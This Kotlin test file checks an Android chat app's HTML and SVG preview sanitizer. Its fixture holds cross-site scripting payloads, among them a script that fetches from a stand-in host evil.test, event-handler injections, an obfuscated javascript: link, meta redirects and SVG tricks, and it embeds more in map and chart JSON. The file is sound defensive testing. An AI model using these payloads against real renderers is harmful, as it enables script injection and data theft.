package me.rerere.rikkahub.ui.components.richtext

import androidx.compose.material3.lightColorScheme
import me.rerere.rikkahub.ui.pages.webview.prepareFullscreenPreviewHtml
import org.jsoup.Jsoup
import org.junit.Assert.*
import org.junit.Test
import java.io.File

class HtmlRenderPolicyTest {
    private val attack = """
        <!doctype html><html><head><base href="https://evil.test/"><meta http-equiv="refresh" content="0;url=https://evil.test/">
        <script>window.__attack=true;alert('xss');fetch('https://evil.test/secret')</script></head>
        <body onload="window.__attack=true"><h2>Static content</h2><p style="color:rgb(0,128,0)">Readable 中文</p>
        <img src="https://evil.test/image" onerror="window.__attack=true;alert('image')">
        <iframe srcdoc="<script>parent.__attack=true</script>"></iframe><object data="https://evil.test/"></object>
        <form action="https://evil.test/"><input autofocus onfocus="window.__attack=true"><button>Send</button></form>
        <a href="java&#x73;cript:window.__attack=true">bad link</a>
        <svg viewBox="0 0 200 100" onload="window.__attack=true"><script>window.__attack=true</script>
        <foreignObject><img src="bad" onerror="window.__attack=true"></foreignObject>
        <a href="#safe"><set attributeName="href" to="javascript:window.__attack=true"/><text y="20">svg link</text></a>
        <rect x="10" y="30" width="100" height="40" fill="teal"/></svg></body></html>
    """.trimIndent()

    @Test fun `HTML is source first including normalized aliases while typed renderers remain enabled`() {
        listOf("html", "HTML", " language-html ", "{.html}").forEach { assertFalse(codePreviewDefaultsToRendered(it)) }
        listOf("svg", "mermaid", "terminal", "echarts").forEach { assertTrue(codePreviewDefaultsToRendered(it)) }
    }

    @Test fun `raw HTML fragments documents handlers and inline tags stay source`() {
        for (source in listOf(attack, "<div><h2>Title</h2><p>hello</p></div>", "<pre><code class='language-svg'>not a diagram</code></pre>")) {
            val doc = buildMarkdownDocument(source)
            assertTrue(doc.select("script,iframe,img,svg,h2").isEmpty())
            assertEquals(source, doc.selectFirst("pre > code.language-html")!!.wholeText().trimEnd())
        }
        val inline = buildMarkdownDocument("Hello <b onclick='alert(1)'>world</b>!")
        assertTrue(inline.select("b,[onclick]").isEmpty())
        assertTrue(inline.text().contains("<b onclick='alert(1)'>"))
        assertEquals("hello", buildMarkdownDocument("```html\nhello\n```").selectFirst("code")!!.wholeText().trim())
    }

    @Test fun `static sanitizer retains visuals but drops executable elements attributes and URLs`() {
        for (language in listOf("html", "svg", "SVG")) {
            val doc = Jsoup.parse(buildCodePreviewHtml(attack, language))
            assertTrue(doc.select("iframe,object,form,input,button,foreignObject,base,[onload],[onerror],[onfocus]").isEmpty())
            assertTrue(doc.select("script:not([src])").isEmpty())
            assertFalse(doc.outerHtml().contains("evil.test"))
            assertFalse(doc.outerHtml().contains("javascript:"))
            assertFalse(doc.outerHtml().contains("__attack"))
            assertEquals(1, doc.select("svg rect").size)
            assertEquals("0 0 200 100", doc.selectFirst("svg")!!.attr("viewBox"))
            assertTrue(doc.selectFirst("meta[http-equiv=Content-Security-Policy]")!!.attr("content").contains("connect-src 'none'"))
        }
    }

    @Test fun `raw HTML original source survives math normalization and nested SVG protection`() {
        val source = "<div>\\(x^2\\)<svg viewBox='0 0 1 1'><path d='M0 0'/></svg></div>"
        val doc = buildMarkdownDocument(source)
        assertEquals(source, rawHtmlSource(doc.selectFirst("pre")!!)?.trimEnd())
        listOf("    <html>indented</html>", "```html\n<div>fenced</div>\n```", "`<img src='x'>`").forEach {
            assertEquals(it, protectRawHtml(it))
        }
    }

    @Test fun `SVG paint filters visual animation and text survive the static boundary`() {
        val safe = "<svg viewBox='0 0 100 100'><defs><linearGradient id='g'><stop stop-color='red'/></linearGradient></defs><rect width='50' height='50' fill='url(#g)'><animate attributeName='opacity' values='0;1' dur='2s'/></rect><text y='80'>hello</text></svg>"
        val doc = Jsoup.parse(buildCodePreviewHtml(safe, "svg"))
        assertEquals("opacity", doc.selectFirst("animate")!!.attr("attributeName"))
        assertEquals("url(#g)", doc.selectFirst("rect")!!.attr("fill"))
        assertEquals(1, doc.select("linearGradient").size)
        assertTrue(doc.text().contains("hello"))
        assertTrue(isStaticHtmlPreview(doc.outerHtml()))
    }

    @Test fun `HTML preview has readable paper defaults below author colors and SVG stays transparent`() {
        val doc = Jsoup.parse(buildCodePreviewHtml("<style>html { color:white; background:navy; }</style><p>Readable</p>", "html"))
        val styles = doc.head().select("style")
        assertEquals("rikkahub-static-paper", styles.first()!!.id())
        assertTrue(styles.first()!!.data().contains("background:#ffffff"))
        assertTrue(styles[1].data().contains("background:navy"))
        assertFalse(styles.last()!!.data().contains("background:transparent"))
        val svg = Jsoup.parse(buildCodePreviewHtml("<svg viewBox='0 0 10 10'><circle r='4'/></svg>", "svg"))
        assertTrue(svg.select("#rikkahub-static-paper").isEmpty())
        assertTrue(svg.head().select("style").last()!!.data().contains("background:transparent"))
    }

    @Test fun `whole message preview disables raw HTML and unsafe library trust modes`() {
        val html = buildMarkdownPreviewHtml(File("src/main/assets/html/mark.html").readText(), attack, lightColorScheme())
        assertTrue(html.contains("html: false"))
        assertFalse(html.contains("trust: true"))
        assertFalse(html.contains("securityLevel: 'loose'"))
        assertFalse(html.contains("<body onload="))
    }

    @Test fun `generate adversarial production previews for browser verification`() {
        val dir = File("build/reports/html-policy").apply { mkdirs() }
        dir.resolve("html.html").writeText(buildCodePreviewHtml(attack, "html"))
        dir.resolve("svg.html").writeText(buildCodePreviewHtml(attack, "svg"))
        dir.resolve("fullscreen.html").writeText(prepareFullscreenPreviewHtml(buildCodePreviewHtml(attack, "html")))
        val template = File("src/main/assets/html/mark.html").readText()
        dir.resolve("markdown.html").writeText(buildMarkdownPreviewHtml(template,
            "# Safe Markdown\n\n$attack\n\n```mermaid\nflowchart LR; A --> B\n```\n\n${'$'} x^2 ${'$'}", lightColorScheme()))
        dir.resolve("map.html").writeText(buildInteractiveRendererHtml(InteractiveCodeRenderer.LEAFLET,
            """{"markers":[{"lat":30,"lng":120,"popup":"<img src='https://evil.test/map' onerror='window.__attack=true'>"}]}""", lightColorScheme()))
        dir.resolve("chart.html").writeText(buildInteractiveRendererHtml(InteractiveCodeRenderer.ECHARTS,
            """{"tooltip":{"trigger":"axis","renderMode":"html","formatter":"<img src='https://evil.test/chart' onerror='window.__attack=true'>"},"xAxis":{"data":["A","B"]},"yAxis":{},"series":[{"type":"bar","data":[2,4]}]}""", lightColorScheme()))
    }
}
